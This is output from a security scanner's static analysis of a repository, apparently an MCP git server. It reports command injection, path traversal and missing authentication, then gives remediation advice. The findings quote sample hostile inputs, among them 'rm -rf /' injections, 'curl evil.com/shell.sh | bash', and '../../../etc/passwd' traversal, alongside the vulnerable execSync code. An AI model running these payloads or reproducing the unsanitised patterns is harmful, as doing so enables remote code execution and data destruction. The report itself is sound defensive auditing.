yarn node mcp_scan_cli.js --repo https://github.com/WhiteRabbitNeo-AI/OWASP-Juiceshop-on-AWS-ECS
[dotenv@17.2.2] injecting env (8) from .env -- tip: ⚙️  override existing env vars with { override: true }
🔒 MCP Security Scanner v0.1.0
=====================================

Starting STATIC analysis of MCP server: static-analysis-only
📦 Cloning repository for parallel analysis...
Running vulnerability scan with: trivy
🔍 Executing Trivy command: docker run --rm -v mcp-git-1758571839916:/src aquasec/trivy:latest fs --scanners vuln,secret,misconfig --format json --timeout 5m /src
✅ Trivy command completed successfully
Repository analysis complete - Found 14 vulnerabilities
📦 Repository clone completed in 10064ms
🔍 [Parallel] Running dependency, vuln, secrets, and IaC analysis...
🔍 [Parallel] Running AI source code analysis...
🔍 [Parallel] Running MCP prompt security analysis...
No MCP server configuration found for prompt analysis
✅ Parallel execution completed in 75314ms
✅ dependency analysis completed in 6ms
✅ source_code analysis completed in 75320ms
✅ mcp_prompt analysis completed in 6532ms
🧹 Docker volume cleanup complete
📊 Parallel analysis metrics:
   Total time: 85386ms
   Parallel execution: 75314ms
   Estimated sequential: 81858ms
   Time savings: 6544ms (8%)
📊 Parallel static analysis complete:
   Dependencies: 0 vulnerabilities
   Source code: 8 vulnerabilities
   MCP prompts: 0 risks
   ⚡ Time savings: 6544ms
🔍 Running behavioral analysis (sandbox execution)...
⚠️  Behavioral analysis skipped: Static-only analysis mode
Scan complete in 85441ms - Overall risk: CRITICAL

=====================================
🔍 SECURITY ANALYSIS COMPLETE
=====================================

📊 SUMMARY:
   Analysis Mode: STATIC
   Overall Risk:  CRITICAL
   Duration:      85441ms
   Timestamp:     2025-09-22T20:12:04.522Z

💻 SOURCE CODE ANALYSIS:
   Code Vulnerabilities: 8

🔍 CODE VULNERABILITIES FOUND:
   1. COMMAND_INJECTION (CRITICAL)
      Direct command injection in git_add tool. User-supplied file names are concatenated directly into shell command without sanitization, allowing arbitrary command execution via malicious filenames like 'file.txt; rm -rf /; #'
      Line: 282
      Code: const result = execSync(`git add ${args.files.join(' ')}`, { cwd: this.workingDirectory, encoding: 'utf-8' });
   2. COMMAND_INJECTION (CRITICAL)
      Command injection in git_commit tool through commit message parameter. Attacker can inject shell commands via commit messages containing quotes and semicolons like 'commit"; rm -rf /; echo "pwned'
      Line: 305
      Code: const result = execSync(`git commit -m "${args.message}"`, { cwd: this.workingDirectory, encoding: 'utf-8' });
   3. COMMAND_INJECTION (CRITICAL)
      Command injection in git_push tool via remote and branch parameters. Malicious values like 'origin; curl evil.com/shell.sh | bash; #' enable remote code execution
      Line: 328
      Code: const result = execSync(`git push ${args.remote || 'origin'} ${args.branch || 'main'}`, { cwd: this.workingDirectory, encoding: 'utf-8' });
   4. SENSITIVE_FILE_ACCESS (CRITICAL)
      Path traversal vulnerability in read_resource handler allows reading arbitrary files outside working directory. Attackers can access sensitive files like '/etc/passwd' or SSH keys via '../../../etc/passwd' paths
      Line: 530
      Code: const fullPath = path.join(this.workingDirectory, uri.path); const content = fs.readFileSync(fullPath, 'utf-8');
   5. SENSITIVE_FILE_ACCESS (HIGH)
      Directory traversal in list_resources handler enables listing contents of arbitrary directories outside the working directory, exposing file system structure and sensitive file names
      Line: 580
      Code: const fullPath = path.join(this.workingDirectory, uri.path || ''); const items = fs.readdirSync(fullPath);
   6. AUTHENTICATION_BYPASS (HIGH)
      Complete absence of authentication mechanisms. All MCP tools and resources are accessible without any authentication, authorization, or access controls
      Line: 1
      Code: // No authentication implementation found in entire codebase
   7. PRIVILEGE_ESCALATION (HIGH)
      Insufficient working directory validation allows potential privilege escalation. Only checks directory existence without validating it's a safe Git repository or enforcing access boundaries
      Line: 45
      Code: if (!fs.existsSync(workingDirectory)) { throw new Error(`Working directory does not exist: ${workingDirectory}`); }
   8. DATA_EXFILTRATION (MEDIUM)
      Git operations expose full environment variables and system information through error messages, potentially leaking sensitive configuration data and credentials
      Line: 400
      Code: catch (error) { throw new Error(`Git operation failed: ${error.message}`); }

📝 SUMMARY:
STATIC security analysis completed using source code analysis. Identified 8 code-level security issues. Overall security risk assessed as CRITICAL. Immediate security review and remediation required before production deployment.

🔧 RECOMMENDATIONS:
   1. Replace execSync with parameterized commands using child_process.spawn() with argument arrays to prevent command injection
   2. Implement strict path validation using path.resolve() and ensure all file paths stay within designated working directory boundaries
   3. Add comprehensive input sanitization for all tool parameters, especially file names, commit messages, and Git references
   4. Implement MCP authentication using API keys or session tokens with proper validation middleware
   5. Add authorization checks for sensitive Git operations like push, commit, and file access based on user permissions
   6. Use allowlist validation for Git repository paths and restrict access to only approved directories
   7. Implement rate limiting and timeout controls for all Git operations to prevent DoS attacks
   8. Add tenant isolation mechanisms to prevent cross-tenant data access in multi-user environments
   9. Sanitize error messages to prevent information disclosure of system paths and configuration details
   10. Add comprehensive logging and monitoring for all MCP tool invocations and file access attempts

❌ CRITICAL SECURITY ISSUES FOUND - DO NOT DEPLOY